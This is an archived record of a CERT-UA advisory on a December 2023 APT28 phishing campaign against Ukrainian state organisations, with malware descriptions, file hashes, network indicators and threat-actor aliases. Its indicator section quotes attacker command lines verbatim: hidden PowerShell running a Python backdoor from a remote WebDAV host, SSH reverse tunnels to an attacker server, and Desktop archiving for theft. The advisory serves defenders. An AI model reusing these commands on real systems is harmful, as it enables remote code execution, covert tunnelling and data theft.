{
    "id": "59d496f1-23d2-424d-b344-66cefbbf3e7a",
    "created_at": "2024-01-03T02:07:02.431631Z",
    "updated_at": "2024-11-22T02:03:50.512865Z",
    "deleted_at": null,
    "sha1_hash": "655acdbba1095c8339c40f02d2af3d3da50d22c4",
    "title": "APT28: From Initial Damage to Domain Controller Threats in an Hour",
    "authors": "CERT-UA",
    "file_creation_date": "2024-01-02T03:01:11Z",
    "file_modification_date": "2024-01-02T03:01:11Z",
    "file_size": 2684353,
    "plain_text": "CERT-UA\ncert.gov.ua/article/6276894\n\ngeneral information\nDuring December 15-25, 2023, several cases of distribution of e-mails with links to\n\"documents\" were discovered among state organizations, visiting which led to damage of\ncomputers with malicious programs.\nIn the process of investigating the incidents, it was found that the mentioned links redirect the\nvictim to a web resource where, with the help of JavaScript and features of the application\nprotocol \"search\" (\"ms-search\") [1], a shortcut file is downloaded, the opening of which leads\nto the launch A PowerShell command designed to download from a remote (SMB) resource\nand run (open) a decoy document, as well as the Python programming language interpreter\nand the Client.py file classified as MASEPIE.\nUsing MASEPIE, OPENSSH (for building a tunnel), STEELHOOK PowerShell scripts\n(stealing data from Chrome/Edge Internet browsers), and the OCEANMAP backdoor are\nloaded and launched on the computer. In addition, IMPACKET, SMBEXEC, etc. are created\non the computer within an hour from the moment of the initial compromise, with the help of\nwhich network reconnaissance and attempts at further horizontal movement are carried out.\nAccording to the combination of tactics, techniques, procedures and tools, the activity is\nassociated with the activities of the APT28 group. At the same time, it is obvious that the\nmalicious plan also involves taking measures to develop a cyber attack on the entire\ninformation and communication system of the organization. Thus, the compromise of any\ncomputer can pose a threat to the entire network.\nIt should be noted that cases of similar attacks have also been recorded in relation to Polish\norganizations.\nFor reference:\n\n1/8\n\nOCEANMAP is a malicious program developed using the C# programming language.\nThe main functionality consists in executing commands using cmd.exe. The IMAP\nprotocol is used as a control channel. Commands, in base64-encoded form, are\ncontained in message drafts (\"Drafts\") of the corresponding directories of electronic\nmailboxes; each of the drafts contains the name of the computer, the name of the user\nand the version of the OS. The results of executing commands are stored in the\ndirectory of incoming messages (\"INBOX\"). Implemented a mechanism for updating the\nconfiguration (command check interval, addresses and authentication data of mail\naccounts), which involves patching the backdoor executable and restarting the\nprocess. Persistence is ensured by creating a .URL file 'VMSearch.url' in the startup\ndirectory.\nMASEPIE is a malicious program developed using the Python programming language.\nThe main functionality consists in uploading/unloading files and executing commands.\nThe TCP protocol is used as a control channel. Data is encrypted using the AES-128CBC algorithm; the key, which is a sequence of 16 arbitrary bytes, is generated at the\nbeginning of the connection establishment. Backdoor persistence is ensured by\ncreating the 'SysUpdate' key in the 'Run' branch of the OS registry, as well as by using\nthe LNK file 'SystemUpdate.lnk' in the startup directory.\nSTEELHOOK is a PowerShell script that provides the theft of Internet browser data\n(\"Login Data\", \"Local State\") and the DPAPI master key by sending them to the\nmanagement server using an HTTP POST request in base64-encoded form.\n\nIndicators of cyber threats\nFiles:\n\n2/8\n\n9724cecaa8ca38041ee9f2a42cc5a297\n4fa8caea8002cd2247c2d5fd15d4e76762a0f0cdb7a3c9de5b7f4d6b2ab34ec6 2.txt\n5f126b2279648d849e622e4be910b96c\n6bae493b244a94fd3b268ff0feb1cd1fbc7860ecf71b1053bf43eea88e578be9 2.ps1 (STEELHOOK)\n47f4b4d8f95a7e842691120c66309d5b\n18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6 Client.py (MASEPIE)\n8d1b91e8fb68e227f1933cfab99218a4\n6d44532b1157ddc2e1f41df178ea9cbc896c19f79e78b3014073af2d8d9504fe VMSearch.sfx.exe\n6fdd416a768d04a1af1f28ecaa29191b\nfb2c0355b5c3adc9636551b3fd9a861f4b253a212507df0e346287110233dc23 VMSearch.exe\n(OCEANMAP)\n5db75e816b4cef5cc457f0c9e3fc4100\n24fd571600dcc00bf2bb8577c7e4fd67275f7d19d852b909395bebcbb1274e04 VMSearch.exe\n(OCEANMAP)\n6128d9bf34978d2dc7c0a2d463d1bcdd\n19d0c55ac466e4188c4370e204808ca0bc02bba480ec641da8190cb8aee92bdc KFP.311.152.2023.pdf\n.lnk\n825a12e2377dd694bbb667f862d60c43\n593583b312bf48b7748f4372e6f4a560fd38e969399cf2a96798e2594a517bf4\nKFP.311.152.2023.pdf.lnk\nacd9fc44001da67f1a3592850ec09cb7\nc22868930c02f2d6962167198fde0d3cda78ac18af506b57f1ca25ca5c39c50d Strategies of\nUkraine.pdf .lnk\n\nNetwork:\n\n3/8\n\n\\\\194[.]126.178.8@80\\webdav\\Docs\\231130 No. 581.pdf .lnk\n\\\\194[.]126.178.8@80\\webdav\\Docs\\231130 No. 581.pdf\n\\\\194[.]126.178.8@80\\webdav\\Python39\\Client[.]py\n\\\\194[.]126.178.8@80\\webdav\\Python39\\python[.]exe\n173[.]239.196.66 (X-Originating-IP)\n(tcp)://88[.]209.251.6:80\n194[.]126.178.8\n88[.]209.251.6\n74[.]124.219.71 (OCEANMAP C2)\nczyrqdnvpujmmjkfhhvs4knf1av02demj.oast[.]fun\nczyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast[.]fun\nczyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast[.]fun\nczyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast[.]fun\nhXXp://194[.]126.178.8/webdav/wody[.]pdf\nhXXp://194[.]126.178.8/webdav/wody[.]zip\nhXXp://194.126.178.8/webdav/StrategyUa.pdf\nhXXp://194[.]126.178.8/webdav/231130N581[.]pdf\nhXXp://czyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast[.]fun\nhXXp://czyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast[.]fun\nhXXp://czyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast[.]fun\nhXXp://czyrqdnvpujmmjkfhhvs4knf1av02demj.oast[.]fun\nhXXps://nas-files.firstcloudit[.]com/\nhXXps://ua-calendar.firstcloudit[.]com/\nhXXps://e-nas.firstcloudit[.]com/\njrb@bahouholdings.com (OCEANMAP C2)\nnas-files.firstcloudit[.]com\ne-nas.firstcloudit[.]com\nua-calendar.firstcloudit[.]com\nqasim.m@facadesolutionsuae.com (OCEANMAP C2)\nwebmail.facadesolutionsuae[.]com (OCEANMAP C2)\n\nHosts:\n\n4/8\n\n%PROGRAMDATA%\\2.txt\n%PROGRAMDATA%\\python.zip\n%PROGRAMDATA%\\python\\python-3.10.0-embed-amd64\\Client.py\n%USERPROFILE%\\.ssh\\known_hosts\n%LOCALAPPDATA%\\11.zip\n%LOCALAPPDATA%\\Temp\\RarSFX0\\VMSearch.exe\n%LOCALAPPDATA%\\Temp\\RarSFX1\\VMSearch.exe\n%LOCALAPPDATA%\\Temp\\VMSearch.sfx.exe\n%LOCALAPPDATA%\\i.lnk\n%LOCALAPPDATA%\\key\n%LOCALAPPDATA%\\python.zip\n%LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\Client.py\n%LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\python.exe\n%LOCALAPPDATA%\\qz.zip\n%LOCALAPPDATA%\\s.lnk\n%LOCALAPPDATA%\\s.zip\n%LOCALAPPDATA%\\s2.zip\n%LOCALAPPDATA%\\s3.zip\n%LOCALAPPDATA%\\sys.zip\n%LOCALAPPDATA%\\t.lnk\n%LOCALAPPDATA%\\temp1.txt\n%LOCALAPPDATA%\\temp2.txt\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdate.lnk\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VMSearch.url\nC:\\WINDOWS\\system32\\cmd.exe /c \"powershell.exe -c \"$a=Get-Content\n\"%LOCALAPPDATA%\\2.txt\";powershell.exe -windowstyle hidden -encodedCommand $a\"\"C:\\\nWindows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c\n\"%PROGRAMDATA%\\python\\python-3.10.0-embed-amd64\\python.exe\n%PROGRAMDATA%\\python\\python-3.10.0-embed-amd64. 0-embed-amd64\\Client.py\"\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c \"\n[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/\n231130N581.pdf'); \\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\"\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c \"\n[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/\nwody.pdf'); \\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\"\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c \"\n[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/\nStrategyUa.pdf'); \\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\"\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c\n%LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\python.exe\n%LOCALAPPDATA%\\python\\python- 3.10.0-embed-amd64\\Client.py\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hid -nop -c\n\\\\194.126.178.8@80\\webdav\\Python39\\python.exe \\\\194.126.178.8@80\\webdav\\Python39\\\nClient.py\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden encodedCommand\"==\"4AdABlAG4AdAAgAH0AOwAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZA\nAA==\"4AdABlAG4AdAAgAH0AOwAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGk\nAA==\"\n\n5/8\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden encodedCommandQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQA\n\\\\194.126.178.8@80\\webdav\\Python39\\python.exe\n\\\\194.126.178.8@80\\webdav\\Python39\\Client.py\ncmd /C start powershell.exe -w hid -nop -c \"%LOCALAPPDATA%\\python\\python-3.10.0embed-amd64\\python.exe %LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\ Client.py\"\npowershell -c start-process ssh.exe -windowstyle Hidden -ArgumentList \"-N -o\nServerAliveInterval=30 -p80 root@88.209.251.6 -R 88.209.251.6:10858 -i\n%LOCALAPPDATA%\\key -oPubkeyAcceptedKeyTypes=ssh-rsa - oStrictHostKeyChecking=no\" PassThru\npowershell -c start-process ssh.exe -windowstyle Hidden -ArgumentList \"-N -o\nServerAliveInterval=30 -p80 root@88.209.251.6 -R 88.209.251.6:10859 -i\n%LOCALAPPDATA%\\key -oPubkeyAcceptedKeyTypes=ssh-rsa - oStrictHostKeyChecking=no\" PassThru\npowershell.exe -c \"$a=Get-Content \"%PROGRAMDATA%\\2.txt\"; powershell.exe -windowstyle\nhidden -encodedCommand $a\"powershell.exe -c $a=Get-Content \"%PROGRAMDATA%\\2 .txt\";\npowershell.exe -windowstyle hidden -encodedCommand $a\npowershell.exe -c $a=Get-Content -Encoding 'Default' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'String' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'ascii' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path \"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path\n\"%LOCALAPPDATA%\\temp.txt\";Compress-Archive -Force \"$a\" %LOCALAPPDATA%\\s.zip\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path \"%LOCALAPPDATA%\\temp.txt\";dir\n\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path\n\"%LOCALAPPDATA%\\temp1.txt\";Compress-Archive -Force \"$a\" %LOCALAPPDATA%\\s2.zip\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path\n\"%LOCALAPPDATA%\\temp2.txt\";Compress-Archive -Force \"$a\" %LOCALAPPDATA%\\s3.zip\npowershell.exe -c $a=Get-Content -Encoding 'oem' -Path \"%LOCALAPPDATA%\\temp2.txt\";dir\n\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'unicode' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'utf32' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Encoding 'utf8' -Path\n\"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Path \"%LOCALAPPDATA%\\temp.txt\";\"$a\"\npowershell.exe -c $a=Get-Content -Path \"%LOCALAPPDATA%\\temp.txt\";Compress-Archive Force \"$a\" %LOCALAPPDATA%\\s.zip\npowershell.exe -c Compress-Archive -Force %USERPROFILE%\\Desktop\\\n%LOCALAPPDATA%\\qz.zip\npowershell.exe -c Get-WinEvent -FilterHashtable @{logname=\"system\"; id=1129}\npowershell.exe -c Get-WinEvent -FilterHashtable @{logname=\"system\"; id=1501}\npowershell.exe -c dir /S %USERPROFILE% *.dat\npowershell.exe -c import-module ActiveDirectory; Get-AdDomainController\npowershell.exe -c net time /domain\npowershell.exe -c net time /domain:%DOMAIN%.local\n\n6/8\n\npowershell.exe -w hid -nop -c %LOCALAPPDATA%\\python\\python-3.10.0-embedamd64\\python.exe %LOCALAPPDATA%\\python\\python-3.10.0-embed-amd64\\Client.py\npowershell.exe -w hid -nop -c Expand-Archive -Force %PROGRAMDATA%\\python.zip\n%PROGRAMDATA%\\python\npowershell.exe -w hid -nop -c start \"%APPDATA%\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\SystemUpdate.lnk\"\npowershell.exe -w hid -nop gpresult /z\npowershell.exe -w hid -nop gpupdate\npowershell.exe Compress-Archive -Force %USERPROFILE%\\Desktop\\ %LOCALAPPDATA%\\sys.zip\npowershell.exe Compress-Archive -Force %USERPROFILE%\\Desktop\\*.lnk\n%LOCALAPPDATA%\\11.zip\npowershell.exe Compress-Archive %USERPROFILE%\\Desktop %LOCALAPPDATA%\\sys.zip\npowershell.exe Expand-Archive -Force %LOCALAPPDATA%\\python.zip %LOCALAPPDATA%\\python\npowershell.exe Get-ADDomainController\npowershell.exe Get-Content %LOCALAPPDATA%\\i.lnk\npowershell.exe Get-DnsClientServerAddress\npowershell.exe Get-NetAdapter\npowershell.exe Get-NetAdapterBinding | Where-Object ComponentID -EQ 'ms_tcpip6'\npowershell.exe Get-NetIPConfiguration -All\npowershell.exe Resolve-DNSName %DC%\npowershell.exe Resolve-DNSName %DOMAIN%.local\npowershell.exe Test-NetConnection %FS% -Port 445 -v\npowershell.exe [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()\npowershell.exe date\npowershell.exe dir %USERPROFILE%\\Desktop\npowershell.exe ipconfig /flushdns\npowershell.exe net start dnscache\npowershell.exe net stop dnscache\n\nGraphic images\n\n7/8\n\nFig. 1 Example of a chain of damage\n\n8/8",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/s2uqsgl0krjgy2q806x3vy0hx6jfjem8"
    ],
    "report_names": [
        "CERT-UA-8399(12-28-2023)"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2024-11-22T02:02:53.09478Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2024-11-22T02:00:02.469031Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "Pawn Storm",
                "Sednit",
                "IRON TWILIGHT",
                "TA422",
                "T-APT-12",
                "Fighting Ursa",
                "ITG05",
                "UAC-0028",
                "FANCY BEAR",
                "SNAKEMACKEREL",
                "Tsar Team",
                "Group 74",
                "G0007",
                "BlueDelta",
                "Fancy Bear",
                "Sofacy",
                "TG-4127",
                "STRONTIUM",
                "Grizzly Steppe",
                "ATK5",
                "FROZENLAKE",
                "SIG40",
                "Blue Athena",
                "APT-C-20",
                "Forest Blizzard"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2024-11-22T02:00:52.392704Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1704247622431,
    "ts_updated_at": 1732241030512,
    "ts_creation_date": 1704164471000,
    "ts_modification_date": 1704164471000,
    "files": {
        "pdf": "https://archive.orkl.eu/655acdbba1095c8339c40f02d2af3d3da50d22c4.pdf",
        "text": "https://archive.orkl.eu/655acdbba1095c8339c40f02d2af3d3da50d22c4.txt",
        "img": "https://archive.orkl.eu/655acdbba1095c8339c40f02d2af3d3da50d22c4.jpg"
    }
}